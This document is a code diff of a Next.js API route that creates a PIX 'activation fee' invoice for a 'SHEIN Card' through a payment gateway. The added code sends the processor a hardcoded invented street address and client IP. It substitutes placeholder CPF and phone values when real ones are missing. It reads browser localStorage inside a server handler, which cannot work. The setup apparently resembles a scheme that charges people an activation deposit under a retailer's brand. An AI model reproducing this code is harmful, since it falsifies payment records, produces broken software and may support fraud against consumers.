@@ -5,21 +5,9 @@ export async function POST(request: NextRequest) {
     console.log("=== CRIANDO FATURA DE ATIVAÇÃO SUPERPAYBR ===")
 
     const body = await request.json()
-    const { amount = 1.99 } = body // Taxa de ativação padrão
+    const { amount, description } = body
 
-    // Obter dados dos headers
-    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
-    const userEmail = request.headers.get("x-user-email") || ""
-    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
-
-    console.log("📋 Dados para fatura de ativação SuperPayBR:", {
-      amount,
-      customer: {
-        nome: cpfData.nome,
-        email: userEmail,
-        whatsapp: userWhatsApp,
-      },
-    })
+    console.log("📋 Dados da fatura de ativação:", { amount, description })
 
     // Primeiro, fazer autenticação
     const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
@@ -33,35 +21,60 @@ export async function POST(request: NextRequest) {
 
     const accessToken = authResult.data.access_token
 
-    // Preparar dados da fatura de ativação
-    const totalAmount = Math.round(amount * 100) // SuperPayBR usa centavos
+    // Carregar dados do usuário do localStorage (via headers se necessário)
+    const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
+    const userEmail = localStorage.getItem("userEmail") || ""
+    const userWhatsApp = localStorage.getItem("userWhatsApp") || ""
+
+    // Gerar external_id único para ativação
     const externalId = `SHEIN_ACTIVATION_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
 
+    // Preparar dados da fatura de ativação SuperPayBR
     const invoiceData = {
-      external_id: externalId,
-      amount: totalAmount,
-      description: "Taxa de Ativação - Cartão SHEIN",
-      customer: {
+      client: {
         name: cpfData.nome || "Cliente SHEIN",
+        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
         email: userEmail || "cliente@shein.com",
-        phone: userWhatsApp || "",
-        document: cpfData.cpf || "",
+        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
+        address: {
+          street: "Rua Principal",
+          number: "123",
+          district: "Centro",
+          city: "São Paulo",
+          state: "SP",
+          zipcode: "01001000",
+          country: "BR",
+        },
+        ip: "187.1.1.1",
       },
-      payment_method: "PIX",
-      due_date: new Date(Date.now() + 30 * 60 * 1000).toISOString(), // 30 minutos
-      webhook_url: `${request.nextUrl.origin}/api/superpaybr/webhook`,
-      metadata: {
-        type: "activation",
-        product: "SHEIN Card Activation",
-        customer_name: cpfData.nome,
+      payment: {
+        id: externalId,
+        type: "3", // PIX
+        due_at: new Date(Date.now() + 1 * 60 * 60 * 1000).toISOString().split("T")[0], // 1 hora
+        referer: "SHEIN_ACTIVATION",
+        installment: 1,
+        order_url: `${request.nextUrl.origin}/upp/checkout`,
+        store_url: request.nextUrl.origin,
+        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
+        discount: 0,
+        products: [
+          {
+            id: "2",
+            title: description || "Depósito de Ativação - SHEIN Card",
+            qnt: 1,
+            amount: Number.parseFloat(amount.toString()),
+          },
+        ],
+      },
+      shipping: {
+        amount: 0,
       },
     }
 
-    console.log("📤 Enviando dados de ativação para SuperPayBR:", invoiceData)
+    console.log("🚀 Enviando fatura de ativação para SuperPayBR...")
 
     // Criar fatura na SuperPayBR
-    const apiUrl = process.env.SUPERPAYBR_API_URL || "https://api.superpaybr.com"
-    const createResponse = await fetch(`${apiUrl}/invoices`, {
+    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -71,7 +84,7 @@ export async function POST(request: NextRequest) {
       body: JSON.stringify(invoiceData),
     })
 
-    console.log("📥 Resposta da criação de ativação SuperPayBR:", {
+    console.log("📥 Resposta SuperPayBR Ativação:", {
       status: createResponse.status,
       statusText: createResponse.statusText,
       ok: createResponse.ok,
@@ -81,31 +94,40 @@ export async function POST(request: NextRequest) {
       const invoiceResult = await createResponse.json()
       console.log("✅ Fatura de ativação SuperPayBR criada com sucesso!")
 
+      // Extrair dados do PIX
+      const pixPayload = invoiceResult.fatura?.pix?.payload || invoiceResult.pix?.payload || ""
+      const qrCodeImage = invoiceResult.fatura?.pix?.image || invoiceResult.pix?.image || ""
+
+      // Gerar QR Code usando QuickChart como fallback
+      const qrCodeUrl =
+        qrCodeImage ||
+        (pixPayload
+          ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=200`
+          : "/placeholder.svg?height=200&width=200")
+
       // Mapear resposta para formato esperado
       const mappedInvoice = {
-        id: invoiceResult.id || externalId,
-        invoice_id: invoiceResult.invoice_id || invoiceResult.id,
+        id: invoiceResult.fatura?.id || invoiceResult.id || externalId,
+        invoice_id: invoiceResult.fatura?.invoice_id || invoiceResult.invoice_id || externalId,
         external_id: externalId,
         pix: {
-          payload: invoiceResult.payment?.details?.pix_code || invoiceResult.pix_code || "",
-          image: invoiceResult.payment?.details?.qrcode || "",
-          qr_code:
-            invoiceResult.payment?.details?.qrcode ||
-            `https://quickchart.io/qr?text=${encodeURIComponent(invoiceResult.payment?.details?.pix_code || invoiceResult.pix_code || "")}`,
+          payload: pixPayload,
+          image: qrCodeUrl,
+          qr_code: qrCodeUrl,
         },
         status: {
-          code: invoiceResult.status?.code || 1,
-          title: invoiceResult.status?.title || "Aguardando Pagamento",
+          code: invoiceResult.fatura?.status?.code || invoiceResult.status?.code || 1,
+          title: invoiceResult.fatura?.status?.title || invoiceResult.status?.title || "Aguardando Pagamento",
           text: "pending",
         },
         valores: {
-          bruto: totalAmount,
-          liquido: totalAmount,
+          bruto: Math.round(Number.parseFloat(amount.toString()) * 100),
+          liquido: Math.round(Number.parseFloat(amount.toString()) * 100),
         },
         vencimento: {
-          dia: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
+          dia: new Date(Date.now() + 1 * 60 * 60 * 1000).toISOString().split("T")[0],
         },
-        type: "activation",
+        type: "real",
       }
 
       return NextResponse.json({
@@ -118,15 +140,7 @@ export async function POST(request: NextRequest) {
       const errorText = await createResponse.text()
       console.log("❌ Erro ao criar fatura de ativação SuperPayBR:", createResponse.status, errorText)
 
-      // Tentar parsear erro como JSON
-      let errorData = null
-      try {
-        errorData = JSON.parse(errorText)
-      } catch {
-        errorData = { message: errorText }
-      }
-
-      throw new Error(`Erro SuperPayBR ${createResponse.status}: ${errorData.message || errorText}`)
+      throw new Error(`Erro SuperPayBR ${createResponse.status}: ${errorText}`)
     }
   } catch (error) {
     console.log("❌ Erro ao criar fatura de ativação SuperPayBR:", error)
